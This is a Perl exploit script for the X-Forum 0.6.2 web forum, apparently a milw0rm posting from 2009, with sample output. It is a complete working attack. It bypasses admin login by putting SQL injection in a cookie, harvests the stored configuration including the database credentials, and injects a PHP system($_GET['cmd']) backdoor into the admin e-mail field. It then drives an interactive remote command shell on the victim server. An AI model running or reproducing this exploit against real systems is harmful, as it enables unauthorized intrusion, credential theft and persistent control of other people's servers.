<html><head><title>X-Forum 0.6.2 Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# Web App: X-Forum 0.6.2
# Link   : http://freefr.dl.sourceforge.net/sourceforge/x-forum/xforum-0.6.2.tar.gz
# Bug    : Auth Bypass via Cookie Handling
#        : There are also other SQL Injections

# Remote Command Execution Exploit
# Credits to Giovanni Buzzin, &quot;Osirys&quot;
# Mail osirys[at]autistici[dot]org

# It logs in using an SQL Inj (AUTH BYPASS) via Cookie, then edits the configuration
# putting in it the backdoor. Needs the nick of the admin !

# ---------------------------------------------------------------------------
# Sploit
# ---------------------------------------------------------------------------
# osirys[~]&gt;$ perl spll.txt http://localhost/x-forum/xforum/ admin
#
#   ----------------------------
#        X-Forum RCE Exploit
#          Coded by Osirys
#   ----------------------------
#
# [*] Bypassing Admin Login with a evil cookie !
# [*] Admin Login Bypassed ..
# [*] Getting previous configuration ..
# [*] Previous configuration loaded ..
# [*] Overwriting .....
# [*] Configuration edited, backdoored !!
# [*] Shell succesfully spawned !!
# [:D Hi myLord, execute your commands !!
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pwd
# /home/osirys/web/x-forum/xforum
# shell[localhost]$&gt; exit
# [-] Quitting ..
#
# osirys[~]&gt;$
#  ---------------------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

my $host  =  $ARGV[0];
my $user  =  $ARGV[1];
my $rce_p =  &quot;/Config.php?cmd=&quot;;
my @conf  =  ();

chomp($user);
$user =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg;
$user =~ s/([^A-Za-z0-9])/sprintf(&quot;%%%02X&quot;, ord($1))/seg;

$cookie = &quot;cookie_username=&quot;.$user.&quot;' or '1=1; cookie_password=p0wa&quot;;

help(&quot;-1&quot;) unless (($host)&amp;&amp;($user));
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print &quot;[*] Bypassing Admin Login with a evil cookie !\n&quot;;
socket_req(&quot;GET&quot;,$path.&quot;/Configure.php&quot;,$cookie,&quot;Manage Boards&quot;,1);
if ($gotcha == 1) {
    print &quot;[*] Admin Login Bypassed ..\n&quot;;
}
else {
    print &quot;[-] Bad admin's nick or site not vulnerable !\nn&quot;;
    exit(0);
}
print &quot;[*] Getting previous configuration ..\n&quot;;
socket_req(&quot;GET&quot;,$path.&quot;/Configure.php&quot;,$cookie,&quot;&quot;,2);

if (scalar(@conf) == 23) {
    print &quot;[*] Previous configuration loaded ..\n&quot;;
}
print &quot;[*] Overwriting .....\n&quot;;

my $post = &quot;serverName=&quot;.$conf[0].&quot;&amp;userName=&quot;.$conf[1].&quot;&amp;password=&quot;.$conf[2].&quot;&amp;databaseName=&quot;.$conf[3].
           &quot;&amp;iconsDir=&quot;.$conf[4].&quot;&amp;buttonsDir=&quot;.$conf[5].&quot;&amp;emailPassword=FALSE&amp;uniqueEMail=TRUE&amp;member&quot;.
           &quot;Level=0&amp;memberStatus=1&amp;memberGroup=1&amp;threadStatus=1&amp;postStatus=1&amp;forumName=&quot;.$conf[6].&quot;&amp;ic&quot;.
           &quot;onsPerRow=&quot;.$conf[7].&quot;&amp;boardImage=&quot;. $conf[8].&quot;&amp;boardImageNew=&quot;. $conf[9] .&quot;&amp;categoryImage=&quot;
           .$conf[10] .&quot;&amp;categoryImageNew=&quot; . $conf[11] .&quot;&amp;threadImage=&quot;. $conf[12] . &quot;&amp;threadImageNew=&quot;
           .$conf[13].&quot;&amp;backColor=&quot;.$conf[14].&quot;&amp;textColor=&quot;.$conf[15].&quot;&amp;fontFace=&quot;.$conf[16].&quot;&amp;linkCol&quot;.
           &quot;or=&quot;.$conf[17].&quot;&amp;borderColor=&quot;. $conf[18].&quot;&amp;titleColor=&quot;.$conf[19].&quot;&amp;bodyColor=&quot;. $conf[20].
           &quot;&amp;adminEMail=&quot;.$conf[21].&quot;%22%29%3Becho+%22sp4wn%3Cbr%3E%22%3Bsystem%28%24_GET%5Bcmd%5D%29%&quot;.
           &quot;3Bdefine%28%22p0wa%22%2C%22lol&amp;logoutURL=&quot;.$conf[22].&quot;&amp;submit=Update+Configuration&quot;;


$post =~ s/,/%2C/g;
$post =~ s/ /+/g;
$post =~ s/#/%23/g;
$post =~ s/@/%40/g;

socket_req(&quot;POST&quot;,$path.&quot;/SaveConfig.php&quot;,$cookie,$post,0,&quot;&quot;,1);

my $exec_url = ($host.$rce_p);
my $re = get_req($exec_url);
if ($re =~ /sp4wn/) {
    print &quot;[*] Configuration edited, backdoored !!\n[*] Shell succesfully spawned !!\n[:D Hi myLord, execute your commands !!\n\n&quot;;
    &amp;exec_cmd;
}
else {
    print &quot;[-] Something wrong, sploit failed !\n\n&quot;;
    exit(0);
}

sub socket_req() {
    my($request,$path,$cookie,$content,$opt,$regexp,$sock_opt) = @_;
    my $stop;
    my $length = length($content);
    my $socket   =  new IO::Socket::INET(
                                            PeerAddr =&gt; $h0st,
                                            PeerPort =&gt; '80',
                                            Proto    =&gt; 'tcp',
                                         ) or die $!;

    if ($sock_opt == 1) {
        $opt_1 = &quot;Referer: &quot;.$host.&quot;/Configure.php\r\n&quot;;
        $opt_2 = &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    }
    else {
        $opt_1 = &quot;&quot;;
        $opt_2 = &quot;&quot;;
    }
    my $data = $request.&quot; &quot;.$path.&quot; HTTP/1.1\r\n&quot;.
               &quot;Host: &quot;.$h0st.&quot;\r\n&quot;.
               &quot;Keep-Alive: 300\r\n&quot;.
               &quot;Connection: keep-alive\r\n&quot;.
               $opt_1.
               &quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;.
               $opt_2.
               &quot;Content-Length: &quot;.$length.&quot;\r\n\r\n&quot;.
               $content.&quot;\r\n&quot;;

    $socket-&gt;send($data);
    while ((my $e = &lt;$socket&gt;)&amp;&amp;($stop != 1)) {
        if ($opt == 0) {
            $stop = 1;
        }
        elsif ($opt == 1) {
            if ($e =~ /$regexp/) {
                ($stop,$gotcha) = (1,1);
            }
        }
        elsif ($opt == 2) {
            get_previous_conf($e);
        }
    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n\n&quot;;
    $exec_url = $host.$rce_p.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/sp4wn&lt;br&gt;(.+)/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print &quot;$out\n&quot;;
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }

}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua  = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub get_previous_conf() {
    my $string = $_[0];
    if ($string =~ /name=&quot;serverName&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;userName&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;password&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;databaseName&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;iconsDir&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;buttonsDir&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;forumName&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;iconsPerRow&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;boardImage&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;boardImageNew&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;categoryImage&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;categoryImageNew&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;threadImage&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;threadImageNew&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;backColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;textColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;fontFace&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;linkColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;borderColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;titleColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;bodyColor&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;adminEMail&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
    elsif ($string =~ /name=&quot;logoutURL&quot; size=&quot;60&quot; value=&quot;(.+)&quot;&gt;/) {
        push(@conf,$1);
    }
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  ---------------------------- \n&quot;.
          &quot;       X-Forum RCE Exploit     \n&quot;.
          &quot;         Coded by Osirys       \n&quot;.
          &quot;  ---------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Bad Input!\n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path admin_username\n&quot;;
    print &quot;    admin_username is the nick of the admin.\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-03-30]</pre></html>